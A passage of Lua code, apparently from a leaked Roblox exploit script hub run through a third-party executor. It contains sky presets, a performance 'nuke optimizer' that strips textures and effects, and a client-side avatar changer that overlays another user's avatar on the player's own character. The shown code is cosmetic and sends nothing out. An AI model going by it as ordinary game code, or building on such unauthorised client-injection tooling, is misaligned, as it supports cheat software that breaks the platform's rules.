["Arctic"] = {clock=9,brightness=3.2,ambient={200,220,235},outAmb={210,230,245},sky={sun=10,stars=0,moon=0},atm={dens=0.3,color={180,220,255},decay={140,200,240},glare=1.5,haze=1.8},clouds={cover=0.7,dens=0.6,color={250,253,255}}},
["Midnight Ocean"] = {clock=1.5,brightness=1.7,ambient={60,90,130},outAmb={70,100,140},sky={stars=6000,moon=24,sun=0,moonTex=true},atm={dens=0.5,color={20,60,140},decay={10,30,90},glare=0.6,haze=1.5}},
["Vaporwave"] = {clock=19.5,brightness=2.4,ambient={180,120,200},outAmb={190,130,210},sky={stars=1000,moon=14},atm={dens=0.45,color={255,100,220},decay={120,60,255},glare=2.2,haze=2.4},clouds={cover=0.5,dens=0.55,color={200,150,255}}},
["Toxic"] = {clock=13,brightness=2.5,ambient={140,180,80},outAmb={150,190,90},atm={dens=0.55,color={100,220,40},decay={60,150,20},glare=1.8,haze=2.6},clouds={cover=0.65,dens=0.7,color={180,255,120}}},
["Solar Eclipse"] = {clock=12,brightness=0.9,ambient={50,40,60},outAmb={60,50,70},sky={stars=3500,sun=22,moon=0},atm={dens=0.5,color={255,140,40},decay={30,20,40},glare=2.8,haze=1.8}},
["Hellscape"] = {clock=18,brightness=1.8,ambient={200,60,30},outAmb={220,70,40},sky={stars=100,sun=30,moon=0},atm={dens=0.85,color={255,30,0},decay={120,0,0},glare=3.5,haze=4},clouds={cover=0.95,dens=0.95,color={80,20,10}}},
["Heaven"] = {clock=12,brightness=4,ambient={240,235,210},outAmb={250,245,220},sky={sun=16,moon=0,stars=0},atm={dens=0.25,color={255,250,220},decay={255,240,200},glare=3,haze=1.5},clouds={cover=0.85,dens=0.5,color={255,255,255}}},
["Storm"] = {clock=15,brightness=1.4,ambient={90,90,110},outAmb={100,100,120},sky={stars=0,sun=6,moon=0},atm={dens=0.65,color={80,90,120},decay={40,50,80},glare=0.5,haze=3},clouds={cover=0.95,dens=0.95,color={60,65,80}}},
["Sunrise"] = {clock=6.2,brightness=2.8,ambient={220,180,130},outAmb={230,190,140},sky={sun=22,stars=0,moon=0},atm={dens=0.45,color={255,180,100},decay={255,140,80},glare=2.4,haze=2.2},clouds={cover=0.4,dens=0.4,color={255,220,180}}},
["Deep Space"] = {clock=0,brightness=1,ambient={30,25,50},outAmb={40,35,60},sky={stars=15000,moon=0,sun=0},atm={dens=0.08,color={15,5,40},decay={5,0,20},glare=0.2,haze=0.3}},
["Lavender Dream"] = {clock=18.5,brightness=2.6,ambient={180,160,220},outAmb={190,170,230},sky={stars=800,moon=16,sun=0},atm={dens=0.4,color={200,160,255},decay={160,120,220},glare=1.4,haze=1.8},clouds={cover=0.55,dens=0.5,color={220,200,255}}},
["Inferno"] = {clock=17.5,brightness=2.2,ambient={220,100,40},outAmb={235,110,50},sky={sun=26,moon=0,stars=0},atm={dens=0.6,color={255,90,20},decay={200,40,0},glare=3,haze=3.2},clouds={cover=0.7,dens=0.7,color={200,80,40}}},
["Mint Sky"] = {clock=10,brightness=3.2,ambient={180,230,210},outAmb={190,240,220},sky={sun=10},atm={dens=0.32,color={150,255,210},decay={100,220,180},glare=1.6,haze=1.6},clouds={cover=0.55,dens=0.45,color={240,255,250}}},
}
function _vC3(t) return Color3.fromRGB(t[1], t[2], t[3]) end
function _v4mpClearSky()
for _, v in ipairs(Lighting:GetChildren()) do
if v:GetAttribute("_SoundDuelsSky") then pcall(function() v:Destroy() end) end
end
local terrain = workspace:FindFirstChildOfClass("Terrain")
if terrain then
for _, v in ipairs(terrain:GetChildren()) do
if v:GetAttribute("_SoundDuelsSky") then pcall(function() v:Destroy() end) end
end
end
end
function applyCustomSky(mode)
_v4mpClearSky()
local preset = SKY_PRESETS[mode]
if not preset or preset.kind == "off" then
Lighting.FogEnd = 100000; Lighting.FogStart = 0
Lighting.FogColor = Color3.fromRGB(192,192,192)
Lighting.Brightness = 2; Lighting.ClockTime = 14; Lighting.GlobalShadows = true
V.skyTheme = "Off"
return
end
Lighting.FogEnd = 100000; Lighting.FogStart = 0
Lighting.FogColor = Color3.fromRGB(200,200,200)
Lighting.GlobalShadows = true
Lighting.ClockTime = preset.clock or 14
Lighting.Brightness = preset.brightness or 2
if preset.outAmb then Lighting.OutdoorAmbient = _vC3(preset.outAmb) end
if preset.ambient then Lighting.Ambient = _vC3(preset.ambient) end
if preset.sky then
local sky = Instance.new("Sky")
sky:SetAttribute("_SoundDuelsSky", true)
if preset.sky.stars then sky.StarCount = preset.sky.stars end
if preset.sky.moon then sky.MoonAngularSize = preset.sky.moon end
if preset.sky.sun then sky.SunAngularSize = preset.sky.sun end
if preset.sky.moonTex then sky.MoonTextureId = "rbxasset://sky/moon.jpg" end
sky.Parent = Lighting
end
if preset.atm then
local atm = Instance.new("Atmosphere")
atm:SetAttribute("_SoundDuelsSky", true)
atm.Density = preset.atm.dens or 0.3
atm.Color = _vC3(preset.atm.color)
atm.Decay = _vC3(preset.atm.decay)
atm.Glare = preset.atm.glare or 1
atm.Haze = preset.atm.haze or 1
atm.Parent = Lighting
end
local terrain = workspace:FindFirstChildOfClass("Terrain")
if preset.clouds and terrain then
local clouds = Instance.new("Clouds")
clouds:SetAttribute("_SoundDuelsSky", true)
clouds.Cover = preset.clouds.cover or 0.5
clouds.Density = preset.clouds.dens or 0.5
clouds.Color = _vC3(preset.clouds.color)
clouds.Parent = terrain
end
V.skyTheme = mode
end
function enableUltraMode()
V.ultraModeEnabled = true
applyKTMOptimization()
end
function disableUltraMode()
V.ultraModeEnabled = false
end
function enableRemoveAccessories()
V.removeAccessoriesEnabledSep = true
removeAccessoriesEnabled = true
removeAllAccessories()
if V.removeAccConn then V.removeAccConn:Disconnect() end
V.removeAccConn = Players.PlayerAdded:Connect(function(player)
player.CharacterAdded:Connect(function(char)
task.wait(0.5)
if V.removeAccessoriesEnabledSep or removeAccessoriesEnabled then
for _,obj in ipairs(char:GetDescendants()) do processAntiLagDescendant(obj) end
end
end)
end)
if antiLagDescConn then antiLagDescConn:Disconnect() end
antiLagDescConn = Workspace.DescendantAdded:Connect(function(obj)
if antiLagEnabled or V.ultraModeEnabled or removeAccessoriesEnabled or V.removeAccessoriesEnabledSep then
processAntiLagDescendant(obj)
end
end)
end
function disableRemoveAccessories()
V.removeAccessoriesEnabledSep = false
removeAccessoriesEnabled = false
if V.removeAccConn then V.removeAccConn:Disconnect(); V.removeAccConn = nil end
if not antiLagEnabled and not V.ultraModeEnabled and antiLagDescConn then antiLagDescConn:Disconnect(); antiLagDescConn = nil end
end
_nukeOptimizerOn = false
_nukeOptimizerConns = {}
_nukeOptimizerThreads = {}
function enableNukeOptimizer()
if _nukeOptimizerOn then return end
_nukeOptimizerOn = true
nukeOptimiserEnabled = true
V.nukeOptEnabled = true
local MaterialService = game:GetService("MaterialService")
local XMin, XMax = -560, -240
local ClothingClasses = {"Shirt","Pants","ShirtGraphic","Accessory","Hat","HairAccessory","FaceAccessory","NeckAccessory","ShoulderAccessory","FrontAccessory","BackAccessory","WaistAccessory"}
local BASE_NAMES = {"baseplate","spawnlocation","spawn location","spawn"}
function SafeDestroy(obj)
if obj and obj.Name == "Overhead" then return end
pcall(function() obj:Destroy() end)
end
function IsCharacterPart(obj)
for _, plr in ipairs(Players:GetPlayers()) do
if plr.Character and (obj == plr.Character or obj:IsDescendantOf(plr.Character)) then return true end
end
local p = obj
while p and p ~= workspace and p ~= game do
if p:IsA("Model") and p:FindFirstChildOfClass("Humanoid") then return true end
p = p.Parent
end
return false
end
function IsClothing(obj)
if IsCharacterPart(obj) then return false end
for _, className in ipairs(ClothingClasses) do
if obj:IsA(className) then return true end
end
return false
end
function IsOutOfRange(obj)
if obj:IsA("BasePart") then
local x = obj.Position.X
return x < XMin or x > XMax
end
return false
end
function IsBase(obj)
if not obj:IsA("BasePart") then return false end
local nl = obj.Name:lower()
for _, n in ipairs(BASE_NAMES) do
if nl:find(n, 1, true) then return true end
end
return false
end
function IsInBase(obj)
local p = obj.Parent
while p and p ~= workspace do
if IsBase(p) then return true end
p = p.Parent
end
return false
end
function MakeTransparent(obj)
pcall(function()
if IsBase(obj) and not IsCharacterPart(obj) then
obj.Transparency = 1
obj.CastShadow = false
end
end)
end
function StripObject(obj)
pcall(function()
if obj:IsA("Texture") or obj:IsA("Decal") or obj:IsA("SpecialMesh") then
SafeDestroy(obj)
elseif obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam") or obj:IsA("Smoke") or obj:IsA("Fire") or obj:IsA("Sparkles") then
pcall(function() obj.Enabled = false end)
SafeDestroy(obj)
elseif obj:IsA("SurfaceAppearance") then
SafeDestroy(obj)
elseif obj:IsA("BasePart") then
obj.CastShadow = false
obj.Material = Enum.Material.Plastic
obj.MaterialVariant = ""
obj.Reflectance = 0
end
end)
end
function CleanObject(obj)
pcall(function()
if obj:IsA("SurfaceAppearance") then
SafeDestroy(obj)
elseif obj:IsA("Decal") or obj:IsA("Texture") then
if not (obj.Name == "face" and obj.Parent and obj.Parent.Name == "Head") then SafeDestroy(obj) end
elseif obj:IsA("SpecialMesh") then
obj.TextureId = ""
elseif obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam") then
SafeDestroy(obj)
elseif obj:IsA("PointLight") or obj:IsA("SpotLight") or obj:IsA("SurfaceLight") then
SafeDestroy(obj)
elseif obj:IsA("Fire") or obj:IsA("Smoke") or obj:IsA("Sparkles") or obj:IsA("Explosion") then
SafeDestroy(obj)
elseif obj:IsA("Animation") or obj:IsA("AnimationController") then
-- jangan hapus animasi karakter (Animate / animation pack)
if not IsCharacterPart(obj) and not obj:FindFirstAncestor("Animate") then
SafeDestroy(obj)
end
elseif obj:IsA("BasePart") then
obj.CastShadow = false
obj.Material = Enum.Material.Plastic
obj.MaterialVariant = ""
obj.Reflectance = 0
end
end)
end
function ApplyGreySky()
pcall(function()
for _, obj in ipairs(Lighting:GetChildren()) do
if obj:IsA("Sky") then obj:Destroy() end
end
local sky = Instance.new("Sky")
sky.SkyboxBk = ""; sky.SkyboxDn = ""; sky.SkyboxFt = ""
sky.SkyboxLf = ""; sky.SkyboxRt = ""; sky.SkyboxUp = ""
sky.CelestialBodiesShown = false
sky.Name = "_SoundDuelsNukeSky"
sky.Parent = Lighting
end)
end
function OptimizeLighting()
pcall(function()
Lighting.GlobalShadows = false
Lighting.FogEnd = 9e9
Lighting.FogStart = 9e9
Lighting.EnvironmentDiffuseScale = 0
Lighting.EnvironmentSpecularScale = 0
Lighting.Brightness = 1.5
Lighting.Ambient = Color3.fromRGB(60,60,60)
for _, v in ipairs(Lighting:GetChildren()) do
if v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("SunRaysEffect") or v:IsA("DepthOfFieldEffect") or v:IsA("Atmosphere") or v:IsA("Clouds") then
v:Destroy()
end
end
ApplyGreySky()
end)
end
function ApplyTerrain()
pcall(function()
local terrain = workspace:FindFirstChildOfClass("Terrain")
if terrain then
terrain.Decoration = false
terrain.WaterWaveSize = 0
terrain.WaterWaveSpeed = 0
terrain.WaterReflectance = 0
terrain.WaterTransparency = 1
end
end)
end
function OptimizeCharacter(char)
if not char then return end
task.spawn(function()
task.wait(0.3)
-- karakter (baju, celana, rambut, aksesoris) sengaja tidak disentuh
end)
end
pcall(function()
settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
settings().Rendering.MeshPartDetailLevel = Enum.MeshPartDetailLevel.Level01
end)
pcall(function() if setfpscap then setfpscap(999) end end)
table.insert(_nukeOptimizerThreads, task.spawn(function()
if not game:IsLoaded() then game.Loaded:Wait() end
OptimizeLighting()
ApplyTerrain()
for _, obj in ipairs(workspace:GetDescendants()) do
if not _nukeOptimizerOn then return end
if IsBase(obj) then
MakeTransparent(obj)
elseif IsClothing(obj) then
SafeDestroy(obj)
elseif IsInBase(obj) then
elseif IsCharacterPart(obj) then
elseif IsOutOfRange(obj) then
SafeDestroy(obj)
else
CleanObject(obj)
StripObject(obj)
end
end
for _, obj in ipairs(workspace:GetDescendants()) do MakeTransparent(obj) end
end))
table.insert(_nukeOptimizerConns, workspace.DescendantAdded:Connect(function(obj)
if not _nukeOptimizerOn then return end
task.defer(function()
if not _nukeOptimizerOn then return end
if IsBase(obj) then MakeTransparent(obj); return end
if IsClothing(obj) then
SafeDestroy(obj)
elseif IsInBase(obj) then
elseif IsCharacterPart(obj) then
elseif IsOutOfRange(obj) then
SafeDestroy(obj)
else
CleanObject(obj)
StripObject(obj)
end
end)
end))
table.insert(_nukeOptimizerConns, Lighting.DescendantAdded:Connect(function(obj)
if not _nukeOptimizerOn then return end
if obj:IsA("Atmosphere") or obj:IsA("Clouds") or obj:IsA("PostEffect") then SafeDestroy(obj) end
end))
table.insert(_nukeOptimizerConns, MaterialService.DescendantAdded:Connect(function(obj)
if not _nukeOptimizerOn then return end
SafeDestroy(obj)
end))
for _, plr in ipairs(Players:GetPlayers()) do
OptimizeCharacter(plr.Character)
table.insert(_nukeOptimizerConns, plr.CharacterAdded:Connect(OptimizeCharacter))
end
table.insert(_nukeOptimizerConns, Players.PlayerAdded:Connect(function(plr)
table.insert(_nukeOptimizerConns, plr.CharacterAdded:Connect(OptimizeCharacter))
end))
table.insert(_nukeOptimizerThreads, task.spawn(function()
while _nukeOptimizerOn do
task.wait(15)
pcall(function() collectgarbage("collect") end)
end
end))
end
function disableNukeOptimizer()
_nukeOptimizerOn = false
nukeOptimiserEnabled = false
V.nukeOptEnabled = false
for _, c in ipairs(_nukeOptimizerConns) do pcall(function() c:Disconnect() end) end
_nukeOptimizerConns = {}
_nukeOptimizerThreads = {}
end
function enableCustomFont() customFontVisualEnabled=false; if V then V.customFontEnabled=false end end
function disableCustomFont() customFontVisualEnabled=false; if V then V.customFontEnabled=false end end
__ace_src_enableNoCamCollision = enableNoCamCollision
function enableNoCamCollision()
__ace_src_enableNoCamCollision()
noCamCollisionEnabled = true
end
__ace_src_disableNoCamCollision = disableNoCamCollision
function disableNoCamCollision()
__ace_src_disableNoCamCollision()
noCamCollisionEnabled = false
end

_G.SoundInstallAvatarChanger = function()
    local XAC = {
        model = nil,
        renderConn = nil,
        fpConn = nil,
        hideConn = nil,
        hideEnforceConn = nil,
        motorPairs = {},
        fpHidden = {},
        hiddenParts = {},
        paused = false,
        lastUserId = nil,
        lastUsername = nil,
    }
    _G.SoundAvatarChangerState = XAC

    local function getFolder()
        local cam = workspace.CurrentCamera
        if not cam then return nil end
        local folder = cam:FindFirstChild("_SoundAvatarOverlay")
        if not folder then
            folder = Instance.new("Folder")
            folder.Name = "_SoundAvatarOverlay"
            folder.Parent = cam
        end
        return folder
    end

    local function stopConn(name)
        local c = XAC[name]
        if c then pcall(function() c:Disconnect() end) end
        XAC[name] = nil
    end

    local function restoreReal()
        for inst, old in pairs(XAC.hiddenParts) do
            if inst and inst.Parent then
                pcall(function()
                    if inst:IsA("BasePart") then
                        inst.LocalTransparencyModifier = old
                    elseif inst:IsA("Decal") or inst:IsA("Texture") then
                        inst.Transparency = old
                    end
                end)
            end
        end
        table.clear(XAC.hiddenParts)
    end

    local function setRealHidden(on)
        stopConn("hideConn")
        stopConn("hideEnforceConn")
        restoreReal()
        if not on then return end

        local function hideOne(inst)
            if inst:IsA("BasePart") then
                if XAC.hiddenParts[inst] == nil then
                    XAC.hiddenParts[inst] = inst.LocalTransparencyModifier
                end
                inst.LocalTransparencyModifier = 1
            elseif inst:IsA("Decal") or inst:IsA("Texture") then
                if XAC.hiddenParts[inst] == nil then
                    XAC.hiddenParts[inst] = inst.Transparency
                end
                inst.Transparency = 1
            end
        end

        local char = LP.Character
        if not char then return end
        for _, inst in ipairs(char:GetDescendants()) do pcall(hideOne, inst) end

        XAC.hideConn = char.DescendantAdded:Connect(function(inst)
            task.defer(function()
                if inst and inst.Parent then pcall(hideOne, inst) end
            end)
        end)

        XAC.hideEnforceConn = RunService.RenderStepped:Connect(function()
            local c = LP.Character
            if not c or not XAC.model then return end
            for _, inst in ipairs(c:GetDescendants()) do pcall(hideOne, inst) end
        end)
    end

    local function restoreOverlay()
        for inst, old in pairs(XAC.fpHidden) do
            if inst and inst.Parent then
                pcall(function()
                    if inst:IsA("BasePart") then
                        inst.LocalTransparencyModifier = old
                    elseif inst:IsA("Decal") or inst:IsA("Texture") then
                        inst.Transparency = old
                    end
                end)
            end
        end
        table.clear(XAC.fpHidden)
    end

    local function hideOverlay()
        if not XAC.model then return end
        for _, inst in ipairs(XAC.model:GetDescendants()) do
            if inst:IsA("BasePart") then
                if XAC.fpHidden[inst] == nil then
                    XAC.fpHidden[inst] = inst.LocalTransparencyModifier
                end
                inst.LocalTransparencyModifier = 1
            elseif inst:IsA("Decal") or inst:IsA("Texture") then
                if XAC.fpHidden[inst] == nil then
                    XAC.fpHidden[inst] = inst.Transparency
                end
                inst.Transparency = 1
            end
        end
    end

    local function startFirstPerson()
        stopConn("fpConn")
        local hidden = false
        XAC.fpConn = RunService.RenderStepped:Connect(function()
            local cam = workspace.CurrentCamera
            local char = LP.Character
            local head = char and char:FindFirstChild("Head")
            if not XAC.model or not cam or not head then return end

            local d = (cam.CFrame.Position - head.Position).Magnitude
            local lockFP = LP.CameraMode == Enum.CameraMode.LockFirstPerson

            --Leaked By Xlu0 AndPrime--
            if hidden then
                if not lockFP and d > 1.15 then hidden = false end
            else
                if lockFP or d <= 0.95 then hidden = true end
            end

            if hidden then
                --Leaked By Xlu0 AndPrime--
                hideOverlay()
                for _, inst in ipairs(XAC.model:GetDescendants()) do
                    if inst:IsA("BasePart") then
                        inst.LocalTransparencyModifier = 1
                    elseif inst:IsA("Decal") or inst:IsA("Texture") then
                        inst.Transparency = 1
                    end
                end
            elseif next(XAC.fpHidden) ~= nil then
                restoreOverlay()
            end
        end)
    end

    local function destroyOverlay()
        stopConn("renderConn")
        stopConn("fpConn")
        restoreOverlay()
        if XAC.model then pcall(function() XAC.model:Destroy() end) end
        XAC.model = nil
        XAC.paused = false
    end

    local function prepare(model)
        for _, d in ipairs(model:GetDescendants()) do
            if d:IsA("Script") or d:IsA("LocalScript") then
                d.Disabled = true
            elseif d:IsA("BasePart") then
                d.CanCollide = false
                d.CanTouch = false
                d.CanQuery = false
                d.Massless = true
            end
        end
        local hum = model:FindFirstChildOfClass("Humanoid")
        if hum then
            hum.PlatformStand = true
            hum.AutoRotate = false
            hum.Sit = true
            hum.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
            hum.NameDisplayDistance = 0
            hum.HealthDisplayDistance = 0
        end
        return model
    end

    local function motorKey(m)
        return m.Name .. "|" ..
            ((m.Part0 and m.Part0.Name) or "nil") .. ">" ..
            ((m.Part1 and m.Part1.Name) or "nil")
    end

    local function buildPairs(srcChar, target)
        table.clear(XAC.motorPairs)
        local a, b = {}, {}
        for _, d in ipairs(srcChar:GetDescendants()) do
            if d:IsA("Motor6D") then a[motorKey(d)] = d end
        end
        for _, d in ipairs(target:GetDescendants()) do
            if d:IsA("Motor6D") then b[motorKey(d)] = d end
        end
        for k, src in pairs(a) do
            if b[k] then table.insert(XAC.motorPairs, {src = src, tgt = b[k]}) end
        end
    end

    local function startMirror()
        stopConn("renderConn")
        XAC.renderConn = RunService.RenderStepped:Connect(function()
            if XAC.paused or not XAC.model then return end
            for _, pair in ipairs(XAC.motorPairs) do
                if pair.src and pair.tgt and pair.src.Parent and pair.tgt.Parent then
                    pair.tgt.Transform = pair.src.Transform
                end
            end
        end)
    end

    local function resolve(value)
        value = tostring(value or ""):gsub("^%s+",""):gsub("%s+$","")
        if value == "" then return false, "ENTER USERNAME / USER ID" end
        local n = tonumber(value)
        if n then
            local uid = math.floor(n)
            local ok, name = pcall(function() return Players:GetNameFromUserIdAsync(uid) end)
            if not ok or not name then return false, "USER NOT FOUND" end
            return true, uid, name
        end
        local ok, uid = pcall(function() return Players:GetUserIdFromNameAsync(value) end)
        if not ok or not uid then return false, "USER NOT FOUND" end
        return true, uid, value
    end

    local function spawnAvatar(uid, username, status)
        status = status or function() end
        status("SPAWNING...")
        destroyOverlay()

        local ok, model = pcall(function()
            return Players:CreateHumanoidModelFromUserIdAsync(uid)
        end)
        if not ok or typeof(model) ~= "Instance" then
            status("FAILED")
            return
        end

        model = prepare(model)
        model.Name = "SoundAvatarOverlay_" .. tostring(uid)

        local folder = getFolder()
        local char = LP.Character
        local myHRP = char and char:FindFirstChild("HumanoidRootPart")
        local oHRP = model:FindFirstChild("HumanoidRootPart")
        if not folder or not myHRP or not oHRP then
            model:Destroy()
            status("HRP NOT READY")
            return
        end

        model.Parent = folder
        model:PivotTo(myHRP.CFrame)

        local weld = Instance.new("WeldConstraint")
        weld.Part0 = oHRP
        weld.Part1 = myHRP
        weld.Parent = oHRP

        XAC.model = model
        XAC.lastUserId = uid
        XAC.lastUsername = username
        _G.SoundAvatarChangerCleared = false
        XAC.paused = false

        --Leaked By Xlu0 AndPrime--
        pcall(function()
            if _G.SoundApplyHeadless then
                _G.SoundApplyHeadless(model, _G.SoundHeadlessEnabled == true)
            end
            if _G.SoundApplyKorblox then
                _G.SoundApplyKorblox(model, _G.SoundKorbloxEnabled == true)
            end
        end)

        setRealHidden(true)
        buildPairs(char, model)
        startMirror()
        startFirstPerson()
        status("ACTIVE - " .. tostring(username))
    end

    _G.SoundAvatarChangerSpawn = spawnAvatar
    _G.SoundAvatarChangerRemove = function()
        destroyOverlay()
        setRealHidden(false)
        XAC.lastUserId = nil
        XAC.lastUsername = nil
        _G.SoundAvatarChangerCleared = true
    end
    _G.SoundAvatarChangerResolve = resolve

    _G.SoundOpenAvatarChanger = function()
        local old = PlayerGui:FindFirstChild("SoundAvatarChangerGallery")
        if old then old:Destroy() end

        local sg = Instance.new("ScreenGui")
        sg.Name = "SoundAvatarChangerGallery"
        sg.IgnoreGuiInset = true
        sg.ResetOnSpawn = false
        sg.DisplayOrder = 99999
        sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        safeParentGui(sg)

        local shade = Instance.new("TextButton")
        shade.Text = ""
        shade.AutoButtonColor = false
        shade.BackgroundColor3 = Color3.fromRGB(0,0,0)
        shade.BackgroundTransparency = 0.25
        shade.Size = UDim2.fromScale(1,1)
        shade.ZIndex = 1
        shade.Parent = sg

        local panel = Instance.new("Frame")
        panel.AnchorPoint = Vector2.new(0.5,0.5)
        panel.Position = UDim2.fromScale(0.5,0.5)
        panel.Size = UDim2.new(0, 620, 0, 500)
        panel.BackgroundColor3 = Color3.fromRGB(11, 11, 11)
        panel.BackgroundTransparency = 0.04
        panel.BorderSizePixel = 0
        panel.ZIndex = 2
        panel.Parent = sg
        corner(panel,16)
        stroke(panel,COLORS.strokeSoft,1.2,0.15)

        pcall(function()
            local bg = Main and Main:FindFirstChild("CustomBackground")
            if bg and bg:IsA("ImageLabel") and bg.Visible and bg.Image ~= "" then
                local pbg = bg:Clone()
                pbg.Name = "PanelBackground"
                pbg.Size = UDim2.fromScale(1,1)
                pbg.Position = UDim2.fromScale(0,0)
                pbg.ZIndex = 2
                pbg.ImageTransparency = math.max(bg.ImageTransparency,0.18)
                pbg.Parent = panel
                corner(pbg,16)
            end
        end)

        local title = Instance.new("TextLabel")
        title.BackgroundTransparency = 1
        title.Text = "ADAPT AVATAR CHANGER (NOT WORKING)"
        title.TextColor3 = COLORS.white
        title.Font = Enum.Font.GothamMedium
        title.TextSize = 19
        title.TextXAlignment = Enum.TextXAlignment.Left
        title.Position = UDim2.new(0,18,0,10)
        title.Size = UDim2.new(1,-70,0,38)
        title.ZIndex = 4
        title.Parent = panel

        local close = Instance.new("TextButton")
        close.Text = "X"
        close.Font = Enum.Font.GothamMedium
        close.TextSize = 11
        close.TextColor3 = COLORS.white
        close.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
        close.Size = UDim2.fromOffset(34,30)
        close.Position = UDim2.new(1,-46,0,14)
        close.ZIndex = 5
        close.Parent = panel
        corner(close,9)
        stroke(close,COLORS.strokeSoft,1,0.45)

        local input = Instance.new("TextBox")
        input.PlaceholderText = "SEARCH ANY ROBLOX USER..."
        input.ClearTextOnFocus = false
        input.Text = ""
        input.Font = Enum.Font.GothamMedium
        input.TextSize = 11
        input.TextColor3 = COLORS.white
        input.PlaceholderColor3 = Color3.fromRGB(141, 141, 141)
        input.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
        input.BackgroundTransparency = 0.06
        input.Position = UDim2.new(0,18,0,58)
        input.Size = UDim2.new(1,-36,0,36)
        input.ZIndex = 4
        input.Parent = panel
        corner(input,9)
        stroke(input,COLORS.strokeSoft,1,0.5)

        local sectionLabel = Instance.new("TextLabel")
        sectionLabel.BackgroundTransparency = 1
        sectionLabel.Text = "FEATURED"
        sectionLabel.TextColor3 = COLORS.white
        sectionLabel.Font = Enum.Font.GothamMedium
        sectionLabel.TextSize = 10
        sectionLabel.TextXAlignment = Enum.TextXAlignment.Left
        sectionLabel.Position = UDim2.new(0,18,0,98)
        sectionLabel.Size = UDim2.new(1,-36,0,20)
        sectionLabel.ZIndex = 4
        sectionLabel.Parent = panel

        local status = Instance.new("TextLabel")
        status.BackgroundTransparency = 1
        status.Text = "LOADING FEATURED..."
        status.TextColor3 = Color3.fromRGB(181, 181, 181)
        status.Font = Enum.Font.GothamMedium
        status.TextSize = 9
        status.TextXAlignment = Enum.TextXAlignment.Left
        status.Position = UDim2.new(0,18,1,-28)
        status.Size = UDim2.new(1,-36,0,20)
        status.ZIndex = 4
        status.Parent = panel
        status.Size = UDim2.new(1,-190,0,20)

        --Leaked By Xlu0 AndPrime--
        local removeAvatarBtn = Instance.new("TextButton")
        removeAvatarBtn.Name = "RemoveAvatarButton"
        removeAvatarBtn.Text = "REMOVE AVATAR"
        removeAvatarBtn.Font = Enum.Font.GothamMedium
        removeAvatarBtn.TextSize = 9
        removeAvatarBtn.TextColor3 = Color3.fromRGB(255,255,255)
        removeAvatarBtn.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
        removeAvatarBtn.BackgroundTransparency = 0
        removeAvatarBtn.BorderSizePixel = 0
        removeAvatarBtn.Position = UDim2.new(1,-168,1,-34)
        removeAvatarBtn.Size = UDim2.new(0,150,0,26)
        removeAvatarBtn.ZIndex = 6
        removeAvatarBtn.Parent = panel
        corner(removeAvatarBtn,8)
        stroke(removeAvatarBtn,Color3.fromRGB(123, 123, 123),1,0.15)

        removeAvatarBtn.MouseButton1Click:Connect(function()
            if _G.SoundAvatarChangerRemove then
                pcall(_G.SoundAvatarChangerRemove)
                status.Text = "AVATAR REMOVED"
            else
                status.Text = "REMOVE FAILED"
            end
        end)

        local scroll = Instance.new("ScrollingFrame")
        scroll.BackgroundTransparency = 1
        scroll.BorderSizePixel = 0
        scroll.Position = UDim2.new(0,12,0,122)
        scroll.Size = UDim2.new(1,-24,1,-160)
        scroll.ScrollBarThickness = 4
        scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
        scroll.CanvasSize = UDim2.new(0,0,0,0)
        scroll.ZIndex = 4
        scroll.Parent = panel

        local grid = Instance.new("UIGridLayout")
        grid.CellSize = UDim2.fromOffset(132,160)
        grid.CellPadding = UDim2.fromOffset(10,10)
        grid.HorizontalAlignment = Enum.HorizontalAlignment.Center
        grid.SortOrder = Enum.SortOrder.LayoutOrder
        grid.Parent = scroll

        local famousSeeds = {
            "Roblox","Builderman","KreekCraft","Flamingo","ItsFunneh",
            "DenisDaily","RussoTalks","MeganPlays","LeahAshe","Thinknoodles",
            "SharkBlox","InquisitorMaster","GamingWithKev","Sketch","Bandites",
            "TanqR","DVPlays","NightFoxx","iamSanna","Temprist",
            "MiniToon","asimo3089","badcc","NewFissy","Coeptus",
            "Wolfpaq","BelowNatural","callmehbob"
        }

        local featuredUsers = {}
        local searchResults = {}
        local searchToken = 0

        local function clearCards()
            for _, child in ipairs(scroll:GetChildren()) do
                if child:IsA("GuiButton") then child:Destroy() end
            end
        end

        local function addCard(userData, order)
            local card = Instance.new("TextButton")
            card.Text = ""
            card.AutoButtonColor = false
            card.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
            card.BackgroundTransparency = 0.07
            card.BorderSizePixel = 0
            card.LayoutOrder = order
            card.ZIndex = 5
            card.Parent = scroll
            corner(card,11)
            stroke(card,COLORS.strokeSoft,1,0.55)

            local thumb = Instance.new("ImageLabel")
            thumb.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
            thumb.BackgroundTransparency = 0.08
            thumb.BorderSizePixel = 0
            thumb.Position = UDim2.new(0,8,0,8)
            thumb.Size = UDim2.new(1,-16,0,108)
            thumb.ScaleType = Enum.ScaleType.Crop
            thumb.Image = "rbxthumb://type=AvatarHeadShot&id=" .. tostring(userData.id) .. "&w=150&h=150"
            thumb.ZIndex = 6
            thumb.Parent = card
            corner(thumb,9)

            if userData.hasVerifiedBadge == true then
                local verified = Instance.new("TextLabel")
                verified.BackgroundColor3 = Color3.fromRGB(255,255,255)
                verified.BackgroundTransparency = 0.08
                verified.Text = "\u{2713}"
                verified.TextColor3 = Color3.fromRGB(11, 11, 11)
                verified.Font = Enum.Font.GothamMedium
                verified.TextSize = 12
                verified.Size = UDim2.fromOffset(20,20)
                verified.Position = UDim2.new(1,-26,0,14)
                verified.ZIndex = 8
                verified.Parent = card
                corner(verified,999)
            end

            local display = Instance.new("TextLabel")
            display.BackgroundTransparency = 1
            display.Text = tostring(userData.displayName or userData.name)
            display.TextColor3 = COLORS.white
            display.Font = Enum.Font.GothamMedium
            display.TextSize = 9
            display.TextWrapped = true
            display.TextXAlignment = Enum.TextXAlignment.Center
            display.Position = UDim2.new(0,5,0,119)
            display.Size = UDim2.new(1,-10,0,17)
            display.ZIndex = 6
            display.Parent = card

            local username = Instance.new("TextLabel")
            username.BackgroundTransparency = 1
